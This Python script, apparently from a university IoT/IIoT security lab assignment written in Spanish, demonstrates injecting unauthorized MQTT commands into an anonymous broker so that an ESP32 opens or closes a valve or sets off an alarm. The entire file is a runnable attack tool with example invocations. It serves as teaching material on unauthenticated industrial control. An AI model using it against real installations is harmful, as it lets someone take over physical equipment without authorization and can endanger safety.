#!/usr/bin/env python3
"""
SSI - TP IoT/IIoT - Grupo 18
Inyeccion de comandos no autorizados a un actuador.

Uso previsto: laboratorio cerrado y propio, con autorizacion.

Escenario: el broker acepta clientes anonimos, asi que el atacante
publica directamente en el topic de comandos de la valvula. El ESP32,
que no valida el origen del mensaje, ejecuta la orden: abre/cierra la
valvula o dispara la alarma sin que el operador lo haya pedido.

Este es el salto de "leer trafico" (confidencialidad) a "controlar el
proceso fisico" (integridad/seguridad operacional), que es lo que hace
critico el problema en entornos IIoT. Es la misma clase de debilidad
que explotan botnets como Mirai al encadenar acceso no autenticado.

Ejecutar:
  python inject_command.py --host 192.168.1.100 --cmd ABRIR
  python inject_command.py --host 192.168.1.100 --cmd ALARMA
"""
import argparse

import paho.mqtt.client as mqtt

TOPIC_CMD = "planta/lineaA/valvula1/cmd"


def main():
    ap = argparse.ArgumentParser(description="Inyeccion de comando MQTT (lab)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=1883)
    ap.add_argument("--cmd", default="ABRIR",
                    choices=["ABRIR", "CERRAR", "ALARMA"])
    args = ap.parse_args()

    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                         client_id="injector-lab")
    client.connect(args.host, args.port, keepalive=60)
    client.loop_start()

    info = client.publish(TOPIC_CMD, args.cmd, qos=1)
    info.wait_for_publish()
    print(f"[+] Comando inyectado: {TOPIC_CMD} -> {args.cmd}")
    client.loop_stop()


if __name__ == "__main__":
    main()
